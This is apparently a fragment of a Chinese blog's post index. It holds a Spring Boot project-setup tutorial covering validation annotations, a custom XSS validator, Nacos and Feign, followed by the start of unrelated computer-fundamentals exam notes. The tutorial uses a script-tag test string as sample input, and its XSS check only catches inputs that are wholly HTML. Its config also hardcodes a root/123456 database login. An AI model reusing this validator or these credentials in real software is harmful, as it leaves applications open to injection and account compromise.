menu) { List\u0026lt;SysMenu\u0026gt; menus = menuService.selectMenuList(menu, getUserId()); return AjaxResult.success(menus); } 参数校验 参考链接：\nhttps://blog.csdn.net/qq_37132495/article/details/118804544\n参数检验之\u0026mdash;\u0026mdash;\u0026ndash;BindingResult总结\n参数注解说明 注解名称 功能 @Xss 检查该字段是否存在跨站脚本工具 @Null 检查该字段为空 @NotNull 不能为null @NotBlank 不能为空，常用于检查空字符串 @NotEmpty 不能为空，多用于检测list是否size是0 @Max 该字段的值只能小于或等于该值 @Min 该字段的值只能大于或等于该值 @Past 检查该字段的日期是在过去 @Future 检查该字段的日期是否是属于将来的日期 @Email 检查是否是一个有效的email地址 @Pattern(regex=,flag=) 被注释的元素必须符合指定的正则表达式 @Range(min=,max=,message=) 被注释的元素必须在合适的范围内 @Size(min=, max=) 检查该字段的size是否在min和max之间，可以是字符串、数组、集合、Map等 @Length(min=,max=) 检查所属的字段的长度是否在min和max之间,只能用于字符串 @AssertTrue 用于boolean字段，该字段只能为true @AssertFalse 该字段的值只能为false 1.pom.xml 1 2 3 4 5 \u0026lt;!-- 自定义验证注解 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-validation\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 2.校验注解 1.在controller上声明@Validated需要对数据进行校验\n1 2 3 4 @GetMapping(\u0026#34;/args\u0026#34;) public String argsTest(@Validated @RequestBody SysUser sysUser){ return \u0026#34;success\u0026#34;; } 2.在对应字段Get方法加上参数校验注解，如果不符合验证要求，则会以message的信息为准，返回给前端\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public class SysUser extends BaseEntity { ... // @Xss(message = \u0026#34;用户账号不能包含脚本字符\u0026#34;) @NotBlank(message = \u0026#34;用户账号不能为空\u0026#34;) @Size(min = 0, max = 30, message = \u0026#34;用户账号长度不能超过30个字符\u0026#34;) public String getUserName() { return userName; } public void setUserName(String userName) { this.userName = userName; } @Email(message = \u0026#34;邮箱格式不正确\u0026#34;) @Size(min = 0, max = 50, message = \u0026#34;邮箱长度不能超过50个字符\u0026#34;) public String getEmail() { return email; } public void setEmail(String email) { this.email = email; } @Size(min = 0, max = 11, message = \u0026#34;手机号码长度不能超过11个字符\u0026#34;) public String getPhonenumber() { return phonenumber; } ... } 也可以直接放在字段上面声明。\n1 2 @Size(min = 0, max = 30, message = \u0026#34;用户昵称长度不能超过30个字符\u0026#34;) private String nickName; 3.异常捕获 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 /** * 自定义验证异常 */ @ExceptionHandler(BindException.class) public ApiResponse handleBindException(BindException e, HttpServletRequest request) { // log.error(e.getMessage(), e); // String message = e.getAllErrors().get(0).getDefaultMessage(); // return ApiResponse.error(message); String requestURI = request.getRequestURI(); ApiResponse apiResponse = handleBindingResult(e.getBindingResult()); log.error(\u0026#34;请求地址[ {} ], 发生参数校验异常 \u0026#39;BindException\u0026#39; : {}\u0026#34;, requestURI , apiResponse.get(\u0026#34;msg\u0026#34;)); return apiResponse; } /** * 自定义验证异常 参数校验异常处理 */ @ExceptionHandler(MethodArgumentNotValidException.class) public Object handleMethodArgumentNotValidException(MethodArgumentNotValidException e, HttpServletRequest request) { // log.error(e.getMessage(), e); // String message = e.getBindingResult().getFieldError().getDefaultMessage(); // return ApiResponse.error(message); String requestURI = request.getRequestURI(); ApiResponse apiResponse = handleBindingResult(e.getBindingResult()); log.error(\u0026#34;请求地址[ {} ], 发生参数校验异常 \u0026#39;MethodArgumentNotValidException\u0026#39; : {}\u0026#34;, requestURI , apiResponse.get(\u0026#34;msg\u0026#34;)); return apiResponse; } /** * 处理参数校验异常信息 * @param result * @return */ private ApiResponse handleBindingResult(BindingResult result) { List\u0026lt;String\u0026gt; errorList = new ArrayList\u0026lt;\u0026gt;(); if (result.hasErrors()) { List\u0026lt;FieldError\u0026gt; list = result.getFieldErrors(); for (FieldError error : list) { String message = \u0026#34;\u0026lt;\u0026#34;+ error.getField() + \u0026#34;\u0026gt;校验不通过：\u0026#34; + error.getDefaultMessage(); errorList.add(message); } } if (errorList.size() == 0) { return ApiResponse.error(); } // A0002-参数校验异常 return ApiResponse.error(result.getObjectName()+ \u0026#34;:\u0026#34; + errorList.toString()); } 自定义注解校验 1、新增Xss注解，设置自定义校验器XssValidator.class\n其中的validatedBy属性指定了需要进行校验的策略类集合，这是一个数组。XssValidator.class是自定义的校验器，具体的逻辑由这个校验器来完成。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 /** * 自定义xss校验注解 * */ @Retention(RetentionPolicy.RUNTIME) @Target(value = { ElementType.METHOD, ElementType.FIELD, ElementType.CONSTRUCTOR, ElementType.PARAMETER }) @Constraint(validatedBy = { XssValidator.class }) public @interface Xss { String message() default \u0026#34;不允许任何脚本运行\u0026#34;; Class\u0026lt;?\u0026gt;[] groups() default {}; Class\u0026lt;? extends Payload\u0026gt;[] payload() default {}; } 2、自定义Xss校验器，实现ConstraintValidator接口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /** * 自定义xss校验注解实现 * */ public class XssValidator implements ConstraintValidator\u0026lt;Xss, String\u0026gt; { private final String HTML_PATTERN = \u0026#34;\u0026lt;(\\\\S*?)[^\u0026gt;]*\u0026gt;.*?|\u0026lt;.*? /\u0026gt;\u0026#34;; @Override public boolean isValid(String value, ConstraintValidatorContext constraintValidatorContext) { return !containsHtml(value); } public boolean containsHtml(String value) { Pattern pattern = Pattern.compile(HTML_PATTERN); Matcher matcher = pattern.matcher(value); return matcher.matches(); } } 3、实体类使用自定义的@Xss注解\n1 2 3 4 5 6 7 @Xss(message = \u0026#34;登录账号不能包含脚本字符\u0026#34;) @NotBlank(message = \u0026#34;登录账号不能为空\u0026#34;) @Size(min = 0, max = 30, message = \u0026#34;登录账号长度不能超过30个字符\u0026#34;) public String getLoginName() { return loginName; } 此时在去保存会进行验证，如果不符合规则的字符（例如\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;）会提示登录账号不能包含脚本字符，代表限制成功。\n4、xss过滤器 ==TODO==\n防重复提交 @RepeatSubmit\n菜单控制 数据库 微服务 参考连接\nspringcloud教程 \u0026ndash; 1.快速搭建入门级demo,看这一篇就够了\n创建一个新的工程lab-drive\n1.添加依赖 父级pom文件\n1 2 3 4 5 \u0026lt;modules\u0026gt; \u0026lt;module\u0026gt;lab-admin\u0026lt;/module\u0026gt; \u0026lt;module\u0026gt;lab-common\u0026lt;/module\u0026gt; \u0026lt;module\u0026gt;lab-drive\u0026lt;/module\u0026gt; +++++ \u0026lt;/modules\u0026gt; 子级pom文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-logging\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- SpringBoot Web容器 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;!--以下是排除的组件--\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;!--排除默认自带的log组件--\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-logging\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--log4j2日志相关 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-log4j2\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- SpringBoot yml配置文件编写智能提示 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-configuration-processor\u0026lt;/artifactId\u0026gt; \u0026lt;optional\u0026gt;true\u0026lt;/optional\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- pagehelper 分页插件 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.pagehelper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;pagehelper-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--mysql驱动 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- swagger3--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.springfox\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;springfox-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- 防止进入swagger页面报类型转换错误，排除3.0.0中的引用，手动增加1.6.2版本 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.swagger\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;swagger-models\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.6.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- knife4j --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.xiaoymin\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;knife4j-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.0.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--项目common通用工具类 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.opengms\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lab-common\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--nacos注册中心--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-nacos-discovery\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-bootstrap\u0026lt;/artifactId\u0026gt; \u0026lt;!--\u0026lt;version\u0026gt;3.1.0\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.1.1.RELEASE\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;fork\u0026gt;true\u0026lt;/fork\u0026gt; \u0026lt;!-- 如果没有该配置，devtools不会生效 --\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;executions\u0026gt; \u0026lt;execution\u0026gt; \u0026lt;!--打成可执行的运行包（.jar .war）--\u0026gt; \u0026lt;goals\u0026gt; \u0026lt;goal\u0026gt;repackage\u0026lt;/goal\u0026gt; \u0026lt;/goals\u0026gt; \u0026lt;/execution\u0026gt; \u0026lt;/executions\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-war-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1.0\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;failOnMissingWebXml\u0026gt;false\u0026lt;/failOnMissingWebXml\u0026gt; \u0026lt;warName\u0026gt;${project.artifactId}\u0026lt;/warName\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;finalName\u0026gt;${project.artifactId}\u0026lt;/finalName\u0026gt; \u0026lt;/build\u0026gt; yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 # 项目相关配置 container: # 名称 name: OpenGMS-Lab-Container # 版本 version: 1.0.0 # 版权年份 copyrightYear: 2022 # 文件路径 示例（ Windows配置E:/opengms-lab/uploadPath，Linux配置 /home/opengms-lab/uploadPath） # profile: E:/opengms-lab/uploadPath # 开发环境配置 server: # 服务器的HTTP端口，默认为8080(8888是jupyter默认端口) port: 8810 servlet: context-path: /container spring: profiles: active: dev datasource: name: lab_datasource url: jdbc:mysql://127.0.0.1:3306/opengms_container?useUnicode=true\u0026amp;characterEncoding=utf8\u0026amp;autoReconnect=true\u0026amp;useSSL=false\u0026amp;serverTimezone=Asia/Shanghai driver-class-name: com.mysql.cj.jdbc.Driver username: root password: 123456 cloud: nacos: server-addr: localhost:8848 discovery: enabled: false application: name: lab-container # Springboot2.6以后将SpringMVC 默认路径匹配策略从AntPathMatcher 更改为PathPatternParser，导致出错 mvc: pathmatch: matching-strategy: ant_path_matcher # MyBatis配置 mybatis: # 搜索指定包别名 typeAliasesPackage: org.opengms.**.entity.po # 配置mapper的扫描，找到所有的mapper.xml映射文件 mapperLocations: classpath*:mapper/**/*Mapper.xml # 加载全局的配置文件 configLocation: classpath:mybatis/mybatis-config.xml # Swagger配置 swagger: # 是否开启swagger enabled: true # 请求前缀 pathMapping: /container #socket配置 socket: host: 127.0.0.1 port: 6001 2.项目配置 拷贝项目基础框架文件及文件夹 entity文件夹中的ApiResponse\nconstant文件夹\nconfig文件夹中的AppConfig\nLabApplication\nlombok.config\n线程、跨域、全局异常配置 线程配置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 @Configuration @EnableScheduling //同步 @EnableAsync //异步 public class ScheduleConfig { @Bean public TaskExecutor taskExecutor() { ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor(); // 设置核心线程数 核心线程数线程数定义了最小可以同时运行的线程数量 executor.setCorePoolSize(3); // 设置最大线程数 当队列中存放的任务达到队列容量的时候，当前可以同时运行的线程数量变为最大线程数 executor.setMaxPoolSize(5); // 设置队列容量 当新任务来的时候会先判断当前运行的线程数量是否达到核心线程数，如果达到的话，信任就会被存放在队列中 executor.setQueueCapacity(200); // 设置线程活跃时间（秒） executor.setKeepAliveSeconds(60); // 设置默认线程名称 executor.setThreadNamePrefix(\u0026#34;AsyncThread-\u0026#34;); // 设置拒绝策略 当最大池被填满时，此策略为我们提供可伸缩队列 executor.setRejectedExecutionHandler(new ThreadPoolExecutor.CallerRunsPolicy()); // 等待所有任务结束后再关闭线程池 executor.setWaitForTasksToCompleteOnShutdown(true); return executor; } } 跨域配置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 @Configuration public class WebConfig implements WebMvcConfigurer{ //解决跨域问题 @Override public void addCorsMappings(CorsRegistry registry) { registry.addMapping(\u0026#34;/**\u0026#34;); //允许远端访问的域名 // .allowedOrigins(\u0026#34;http://localhost:8099\u0026#34;) //允许请求的方法(\u0026#34;POST\u0026#34;, \u0026#34;GET\u0026#34;, \u0026#34;PUT\u0026#34;, \u0026#34;OPTIONS\u0026#34;, \u0026#34;DELETE\u0026#34;) // .allowedMethods(\u0026#34;*\u0026#34;) //允许请求头 // .allowedHeaders(\u0026#34;*\u0026#34;); } //登录请求问题 @Override public void addInterceptors(InterceptorRegistry registry) { /** * kn4j 在想文档相关的资源 需要放开 */ String[] swaggerPatterns = { \u0026#34;/swagger-resources/**\u0026#34;, \u0026#34;/webjars/**\u0026#34;, \u0026#34;/v2/**\u0026#34;, \u0026#34;/swagger-ui.html/**\u0026#34;, \u0026#34;/doc.html/**\u0026#34; }; registry.addInterceptor(authenticationInterceptor()) .excludePathPatterns(swaggerPatterns) .addPathPatterns(\u0026#34;/**\u0026#34;); // 拦截所有请求，通过判断是否有 @LoginRequired 注解 决定是否需要登录 } @Bean public AuthenticationInterceptor authenticationInterceptor() { return new AuthenticationInterceptor(); } } 全局异常配置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 @Slf4j @RestControllerAdvice public class GlobalExceptionHandler { /** * 业务异常 */ @ExceptionHandler(ServiceException.class) public ApiResponse handleServiceException(ServiceException e, HttpServletRequest request) { String requestURI = request.getRequestURI(); log.error(\u0026#34;请求地址[ {} ],发生业务异常.\u0026#34;, requestURI, e); Integer code = e.getCode(); return StringUtils.isNotNull(code) ? ApiResponse.error(code, e.getMessage()) : ApiResponse.error(e.getMessage()); } /** * 拦截未知的运行时异常 */ @ExceptionHandler(RuntimeException.class) public ApiResponse handleRuntimeException(RuntimeException e, HttpServletRequest request) { String requestURI = request.getRequestURI(); log.error(\u0026#34;请求地址[ {} ],发生未知异常.\u0026#34;, requestURI, e); return ApiResponse.error(e.getMessage()); } /** * 系统异常 */ @ExceptionHandler(Exception.class) public ApiResponse handleException(Exception e, HttpServletRequest request) { String requestURI = request.getRequestURI(); log.error(\u0026#34;请求地址[ {} ],发生系统异常.\u0026#34;, requestURI, e); return ApiResponse.error(e.getMessage()); } } 日志配置 [跳转](#5. log4j2的配置文件)\n整合mybatis [跳转](# 3. 整合mybatis等初始化配置)\nSwagger集成 [Swagger](# Swagger集成)\nKnife4j\n3.使用nacos 使用springcloud的时候版本要和springboot版本兼容\nhttps://spring.io/projects/spring-cloud#overview\nhttps://blog.csdn.net/qq_38637558/article/details/114448690\nspringboot2.5.x 高版本整合nacos报错\n2022-11-18 18:50:20.449 ERROR 37996 \u0026mdash; [ main] o.s.b.SpringApplication : Application run failed\norg.springframework.beans.factory.BeanCreationException: Error creating bean with name \u0026lsquo;configurationPropertiesBeans\u0026rsquo; defined in class path resource [org/springframework/cloud/autoconfigure/ConfigurationPropertiesRebinderAutoConfiguration.class]: Post-processing of merged bean definition failed; nested exception is java.lang.IllegalStateException: Failed to introspect Class [org.springframework.cloud.context.properties.ConfigurationPropertiesBeans] from ClassLoader [sun.misc.Launcher$AppClassLoader@18b4aac2]\n参考链接\nhttps://github.com/alibaba/spring-cloud-alibaba/wiki/%E7%89%88%E6%9C%AC%E8%AF%B4%E6%98%8E\n安装nacos并启动\n1 startup.cmd -m standalone 项目配置nacos\n在父工程的pom文件中的\u0026lt;dependencyManagement\u0026gt;中引入SpringCloudAlibaba的依赖：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;properties\u0026gt; \u0026lt;spring-boot.version\u0026gt;2.6.7\u0026lt;/spring-boot.version\u0026gt; \u0026lt;spring-cloud.version\u0026gt;2021.0.4\u0026lt;/spring-cloud.version\u0026gt; \u0026lt;spring-cloud-alibaba.version\u0026gt;2021.0.4.0\u0026lt;/spring-cloud-alibaba.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;!-- 依赖声明 --\u0026gt; \u0026lt;dependencyManagement\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;!-- SpringBoot的依赖配置--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;!--\u0026lt;version\u0026gt;2.5.14\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;version\u0026gt;${spring-boot.version}\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- springCloud --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${spring-cloud.version}\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--nacos注册中心--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-alibaba-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${spring-cloud-alibaba.version}\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/dependencyManagement\u0026gt; 然后在各微服务的pom文件中引入nacos-discovery依赖：\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-nacos-discovery\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 各微服务yml配置\n1 2 3 4 5 6 spring: cloud: nacos: server-addr: localhost:8848 application: name: lab-drive 注：如果不想使用nacos作为服务注册和发现的话，设置 spring.cloud.nacos.discovery.enabled 为false\n4.使用feign 添加pom依赖\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;!--feign远程调用--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-openfeign\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--httpClient的依赖 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.github.openfeign\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;feign-httpclient\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--防止出现找不到hostname的异常--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-loadbalancer\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--使用高版本的speingcloud之后，spring想要用loadBalancer替换掉ribbon,启动的时候会有警告--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.ben-manes.caffeine\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;caffeine\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.8.8\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; https://blog.csdn.net/JGMa_TiMo/article/details/121971430\n配置yml\n1 2 3 4 5 6 7 8 9 10 #feign配置 feign: client: config: default: # default全局的配置 loggerLevel: BASIC # 日志级别，BASIC就是基本的请求和响应信息 httpclient: enabled: true # 开启feign对HttpClient的支持 max-connections: 200 # 最大的连接数 max-connections-per-route: 50 # 每个路径的最大连接数 添加@EnableFeignClients注解\n1 2 3 4 @Configuration @EnableFeignClients(basePackages = \u0026#34;org.opengms.admin.clients\u0026#34;) public class ApplicationConfig { } 编写client\n1 2 3 4 5 6 7 8 9 @FeignClient(\u0026#34;lab-container\u0026#34;) public interface ContainerClient { String CONTEXT_PATH = \u0026#34;/container\u0026#34;; @GetMapping(CONTEXT_PATH + \u0026#34;/container/list/image\u0026#34;) ApiResponse listImages(); } 不通过注册中心使用feign\n设置yml\n1 2 3 4 spring: cloud: discovery: enabled: false client\n1 2 3 4 5 6 7 8 9 @FeignClient(name = \u0026#34;lab-container\u0026#34;, url = \u0026#34;localhost:8810/container\u0026#34;) public interface ContainerClient { String CONTEXT_PATH = \u0026#34;\u0026#34;; @GetMapping(CONTEXT_PATH + \u0026#34;/container/list/image\u0026#34;) ApiResponse listImages(); } name：服务名称 （注：若使用注册中心，此处应该写生产者服务名称） url：生产者的url地址\n","permalink":"https://chance7bin.github.io/posts/note/springboot-%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA/","summary":"新建工程和确定工程目录 项目分的模块为： lab-admin项目核心模块 lab-common项目通用工具模块 1. 新建工程及多Module子工程 一、","title":"Springboot 项目搭建"},{"content":" 学习攻略\n真题\n真题，建议从 10 年开始做，10 - 15 年的真题练习用，16 - 18 年真题自己卡时间模拟考\n程序员考试重点汇总 计算机系统基础知识 进制之间的转化 ==表示符：八进制还可以用Q表示==\n==ASCII：美国信息交换标准代码。一般使用7位二进制数来表示字母、数字、标点符号及部分特殊控制字符。==\n十进制和其他进制之间的转换\n==除基取余法：从下往上==\n==乘基取整法：从上往下==\n==不足x位时，小数前在高位加0，小数后在末尾加0==\n==1024 = 2^10^==\n奇校验：整个校验码（有效信息位和校验位）中“1”的个数为奇数。\n偶校验：整个校验码（有效信息位和校验位）中“1”的个数为偶数。\n奇偶校验，可检查1位的错误，不可纠错。\n原、反、补、移码运算和逻辑运算 原码：将数据用二进制形式表示，最高位为符号位, 正数为 0, 负数为 1。\n反码：正数的反码是其本身；负数的反码是在其原码的基础上, 符号位不变，其余各位取反。\n补码：正数的补码是其本身；负数的补码是在其原码的基础上, 符号位不变, 在反码的基础上+1。\n移码：将补码的符号位取反得相应的移码。\n注意：==在补码和移码表示中，0 有唯一的编码，补码中+0 和-0 均为 0000 0000（八位二进制表示下）==。\n多数计算机都采用补码进行加减运算，其符号位和数值位一样参与运算，无须做特殊处理。\n在 n 位二进制表示下：\n原码、反码表示的数据范围为：-（2^n-1^-1）～+（2^n-1^-1）\n补码、移码表示的数据范围为：-2^n-1^～+（2^n-1^-1）\n==补码中，用 1000 0000 表示-128。==\n浮点数 两浮点数进行运算的过程\n运算过程：\n对阶 \u0026gt; 尾数计算 \u0026gt; 结果格式化\n对阶时，小数向大数看齐，对阶是通过==较小数的尾数右移（小数点左移）==实现的\n结果格式化 01、10开头（0.5~1之间）\n逻辑运算 校验码 1、奇偶校验码\n由若干位有效信息（如一个字节），再加上一个二进制位（校验位）组成校验码。\n奇校验：整个校验码（有效信息位和校验位）中“1”的个数为奇数。\n偶校验：整个校验码（有效信息位和校验位）中“1”的个数为偶数。\n奇偶校验，可检查 1 位的错误，不可纠错。\n==奇偶校验，可检查奇数位的错误，不可纠错。如果偶数位发生错误，则发现不了。==\n2、海明码\n在数据位之间插入 K 个校验位，通过扩大码距来实现检错和纠错。\n3、循环冗余校验码（n,k）码\n信息码占 k 位，校验码占 n-k 位，校验码位数越长，校验能力越强。采用了模二运算。\n计算机系统与中央处理器构成 CPU 指令执行过程（流水线技术）\n计算机每执行一条指令都可分为三个阶段：取指令—分析指令—执行指令。\n取指令：根据程序计数器 PC 中的值从程序存储器读出现行指令，送到指令寄存器 IR。\n分析指令：将指令寄存器中的指令操作码取出后进行译码，分析其指令性质。\n执行指令：控制、指挥、协调整个计算机系统的各个子系统, 相互配合、有条不紊的完成各项任务。\n执行程序的过程实际上就是逐条指令地重复上述操作过程，直至遇到停机指令可循环等待指令。\n运算器和控制器的组成\n运算器的构成：\ni. 算术逻辑单元 ALU：数据的算术运算和逻辑运算\nii. 累加寄存器 AC（数据寄存器）：通用寄存器，为 ALU 提供一个工作区，用在暂存数据\niii. 数据缓冲寄存器 DR：写内存时，暂存指令或数据\niv. 状态条件寄存器 PSW：存状态标志与控制标志 